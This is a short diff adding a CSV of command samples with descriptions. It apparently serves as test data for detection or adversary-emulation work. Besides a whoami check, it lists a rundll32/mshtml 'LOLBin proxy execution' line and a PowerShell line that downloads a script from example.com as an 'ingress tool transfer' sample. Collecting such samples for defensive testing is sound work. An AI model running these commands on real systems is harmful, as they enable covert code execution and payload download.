@@ -1,0 +1,4 @@
+command,description
+whoami,Basic identity check
+"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",LOLBin proxy execution sample
+"powershell -c \"(New-Object Net.WebClient).DownloadString('http://example.com/tool.ps1')\"",Ingress tool transfer style sample
